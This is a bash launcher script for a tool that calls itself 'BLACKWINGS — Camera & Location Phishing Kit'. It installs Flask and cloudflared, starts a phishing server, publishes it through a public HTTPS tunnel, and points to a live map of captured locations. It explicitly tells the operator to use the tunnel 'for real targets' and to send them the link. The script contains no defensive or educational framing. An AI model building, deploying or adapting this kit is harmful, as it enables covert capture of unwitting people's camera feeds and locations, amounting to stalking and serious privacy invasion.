#!/usr/bin/env bash
# ============================================================
#   BLACKWINGS — Camera & Location Phishing Kit
#   Author   : Junmo
#   Supports: Kali Linux, Debian, Ubuntu, Arch Linux,
#             BlackArch Linux, Termux (Android)
# ============================================================
set -e
cd "$(dirname "$0")"

BW_HOST="127.0.0.1"
BW_PORT="5000"
SERVER_PID=""
DISTRO="unknown"

RED='\033[1;31m'
GREEN='\033[1;32m'
YELLOW='\033[1;33m'
CYAN='\033[1;36m'
NC='\033[0m'

# ---------- Detect OS / package manager ----------
detect_distro() {
  if [ -n "$TERMUX_VERSION" ] || command -v pkg >/dev/null 2>&1; then
    DISTRO="termux"
  elif command -v pacman >/dev/null 2>&1; then
    DISTRO="arch"
  elif command -v apt-get >/dev/null 2>&1; then
    DISTRO="debian"
  elif command -v dnf >/dev/null 2>&1; then
    DISTRO="fedora"
  else
    DISTRO="unknown"
  fi
}

# Termux has no sudo; root doesn't need it either
SUDO=""
if [ "$DISTRO" != "termux" ] && [ "$(id -u)" != "0" ]; then
  SUDO="sudo"
fi

# ---------- Banner ----------
banner() {
  clear
  echo -e "${RED}"
  echo "   ██████╗ ██╗      █████╗  ██████╗██╗  ██╗██╗    ██╗██╗███╗   ██╗ ██████╗ ███████╗"
  echo "   ██╔══██╗██║     ██╔══██╗██╔════╝██║ ██╔╝██║    ██║██║████╗  ██║██╔════╝ ██╔════╝"
  echo "   ██████╔╝██║     ███████║██║     █████╔╝ ██║ █╗ ██║██║██╔██╗ ██║██║  ███╗███████╗"
  echo "   ██╔══██╗██║     ██╔══██║██║     ██╔═██╗ ██║███╗██║██║██║╚██╗██║██║   ██║╚════██║"
  echo "   ██████╔╝███████╗██║  ██║╚██████╗██║  ██╗╚███╔███╔╝██║██║ ╚████║╚██████╔╝███████║"
  echo "   ╚═════╝ ╚══════╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝  ╚══╝╚══╝ ╚═╝╚═╝  ╚═══╝ ╚═════╝ ╚══════╝"
  echo -e "${NC}"
  echo -e "${RED}   ┌────────────────────────────────────────────────────┐${NC}"
  echo -e "${RED}   │   BLACKWINGS — Camera & Location Phishing Kit      │${NC}"
  echo -e "${RED}   │   Author   : Junmo                                 │${NC}"
  echo -e "${RED}   │   Support  : Kali · Debian · Ubuntu · Arch ·       │${NC}"
  echo -e "${RED}   │              BlackArch · Termux                    │${NC}"
  echo -e "${RED}   └────────────────────────────────────────────────────┘${NC}"
  echo -e "${CYAN}[+] Platform detected: ${DISTRO}${NC}"
}

# ---------- Dependency: Flask ----------
install_flask() {
  if python3 -c "import flask" 2>/dev/null; then
    return 0
  fi
  echo -e "${YELLOW}[!] Flask not found — installing...${NC}"
  case "$DISTRO" in
    termux)
      pip install flask 2>/dev/null || pip3 install flask ;;
    arch)
      $SUDO pacman -S --noconfirm --needed python python-pip >/dev/null 2>&1 || true
      pip install --break-system-packages flask 2>/dev/null \
        || pip install flask 2>/dev/null \
        || $SUDO pacman -S --noconfirm python-flask ;;
    debian)
      pip3 install --break-system-packages flask 2>/dev/null \
        || pip3 install flask 2>/dev/null \
        || $SUDO apt-get install -y python3-flask ;;
    *)
      pip3 install flask ;;
  esac
  python3 -c "import flask" 2>/dev/null
}

# ---------- Dependency: cloudflared ----------
install_cloudflared() {
  if command -v cloudflared >/dev/null 2>&1; then
    return 0
  fi
  echo -e "${YELLOW}[!] cloudflared not found — installing...${NC}"
  case "$DISTRO" in
    termux)
      pkg install -y cloudflared ;;
    arch)
      $SUDO pacman -S --noconfirm cloudflared ;;
    debian)
      if $SUDO apt-get install -y cloudflared >/dev/null 2>&1; then
        return 0
      fi
      echo -e "${YELLOW}[*] Not in repo — downloading official binary...${NC}"
      CF_ARCH="amd64"
      case "$(uname -m)" in
        x86_64)  CF_ARCH="amd64" ;;
        aarch64|arm64) CF_ARCH="arm64" ;;
        armv7l|armhf) CF_ARCH="arm" ;;
        *) echo -e "${RED}[!] Unsupported architecture: $(uname -m)${NC}"; return 1 ;;
      esac
      $SUDO wget -q "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-${CF_ARCH}" -O /usr/local/bin/cloudflared
      $SUDO chmod +x /usr/local/bin/cloudflared
      ;;
    *)
      echo -e "${RED}[!] Install cloudflared manually:${NC}"
      echo -e "${RED}    https://developers.cloudflare.com/cloudflare-one/connections/connect-networks/downloads/${NC}"
      return 1
      ;;
  esac
  command -v cloudflared >/dev/null 2>&1
}

# ---------- LAN IP (works on all distros + Termux) ----------
get_lan_ip() {
  local ip=""
  ip=$(hostname -I 2>/dev/null | awk '{print $1}')
  if [ -z "$ip" ] || [ "$ip" = "127.0.0.1" ]; then
    ip=$(ip -4 addr show scope global 2>/dev/null | awk '/inet /{print $2}' | cut -d/ -f1 | grep -v '^127\.' | head -n1)
  fi
  if [ -z "$ip" ]; then
    ip=$(ifconfig 2>/dev/null | awk '/inet /{print $2}' | sed 's/^addr://' | grep -v '^127\.' | head -n1)
  fi
  [ -z "$ip" ] && ip="127.0.0.1"
  echo "$ip"
}

# ---------- Start Flask server ----------
start_server() {
  echo -e "${GREEN}[*] Starting BLACKWINGS server on http://${BW_HOST}:${BW_PORT} ...${NC}"
  BW_HOST="$BW_HOST" BW_PORT="$BW_PORT" python3 app.py &
  SERVER_PID=$!
  sleep 2
  if ! kill -0 "$SERVER_PID" 2>/dev/null; then
    echo -e "${RED}[!] Server failed to start.${NC}"
    exit 1
  fi
  echo -e "${GREEN}[+] Server is UP (PID $SERVER_PID)${NC}"
  echo -e "${YELLOW}[+] Live Google Map: http://${BW_HOST}:${BW_PORT}/map${NC}"
}

# ---------- Cleanup ----------
cleanup() {
  if [ -n "$SERVER_PID" ] && kill -0 "$SERVER_PID" 2>/dev/null; then
    kill "$SERVER_PID" 2>/dev/null || true
    echo ""
    echo -e "${RED}[-] BLACKWINGS server stopped.${NC}"
  fi
}
trap cleanup EXIT

# ---------- Main ----------
detect_distro

while true; do
  banner
  echo ""
  echo -e "${RED}   ┌────────────────────────────────────────────────────┐${NC}"
  echo -e "${RED}   │  [1] Localhost      → http://127.0.0.1:5000        │${NC}"
  echo -e "${RED}   │  [2] LAN IP         → http://<your-ip>:5000        │${NC}"
  echo -e "${RED}   │  [3] Public Tunnel  → cloudflared HTTPS link       │${NC}"
  echo -e "${RED}   │  [0] Exit                                          │${NC}"
  echo -e "${RED}   └────────────────────────────────────────────────────┘${NC}"
  echo ""
  echo -e -n "${YELLOW}   Choose an option: ${NC}"
  read -r choice

  case "$choice" in
    1)
      BW_HOST="127.0.0.1"
      install_flask
      start_server
      echo -e "${YELLOW}[*] Local mode — open http://127.0.0.1:5000 in your browser.${NC}"
      echo -e "${YELLOW}[*] Press Ctrl+C to stop.${NC}"
      wait "$SERVER_PID"
      ;;
    2)
      BW_HOST="0.0.0.0"
      install_flask
      start_server
      LAN_IP=$(get_lan_ip)
      echo -e "${GREEN}[+] Share on the same network:${NC}"
      echo -e "    ${GREEN}http://${LAN_IP}:${BW_PORT}${NC}"
      echo -e "    ${GREEN}Live map: http://${LAN_IP}:${BW_PORT}/map${NC}"
      if [ "$DISTRO" = "termux" ]; then
        echo -e "${YELLOW}[*] Termux: if IP shows 127.0.0.1, run:  pkg install net-tools${NC}"
        echo -e "${YELLOW}    then re-run option 2. Better: use option 3 (HTTPS tunnel).${NC}"
      fi
      echo -e "${RED}[!] NOTE: phones block camera/geolocation on plain http.${NC}"
      echo -e "${RED}    Use option 3 (HTTPS tunnel) for real targets.${NC}"
      wait "$SERVER_PID"
      ;;
    3)
      BW_HOST="127.0.0.1"
      install_flask
      if ! install_cloudflared; then
        echo -e "${RED}[-] cloudflared required for this mode. Aborting.${NC}"
        exit 1
      fi
      start_server
      echo -e "${YELLOW}[*] Starting cloudflared — copy the https://xxxx.trycloudflare.com URL${NC}"
      echo -e "${YELLOW}    then send it with:  python3 send_link.py <url>${NC}"
      echo -e "${YELLOW}    Live map will be at: <url>/map${NC}"
      echo ""
      cloudflared tunnel --url "http://${BW_HOST}:${BW_PORT}"
      ;;
    0)
      echo -e "${RED}[-] Exiting. Goodbye.${NC}"
      exit 0
      ;;
    *)
      echo -e "${RED}[!] Invalid option.${NC}"
      sleep 1
      ;;
  esac
done